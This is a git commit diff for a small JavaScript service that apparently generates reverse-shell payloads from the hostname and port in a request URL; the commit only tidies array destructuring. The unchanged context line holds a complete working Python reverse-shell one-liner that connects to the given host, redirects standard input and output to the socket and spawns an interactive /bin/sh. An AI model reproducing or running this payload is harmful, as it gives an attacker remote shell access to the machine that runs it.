1e34df37c8b0f1e06b7824396784c546e53a70e4
Luke Childs <lukechilds123@gmail.com>
2017-09-13 14:17:21 +0100

    Don't use undefined for empty array destructering

--- src/index.js
+++ src/index.js
@@ -3,7 +3,7 @@
 const generatePayload = (hostname, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${hostname}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
 
 const reverseShell = req => {
-	const [undefined, hostname, ip] = req.url.split('/');
+	const [, hostname, ip] = req.url.split('/');
 
 	return generatePayload(hostname, ip);
 };
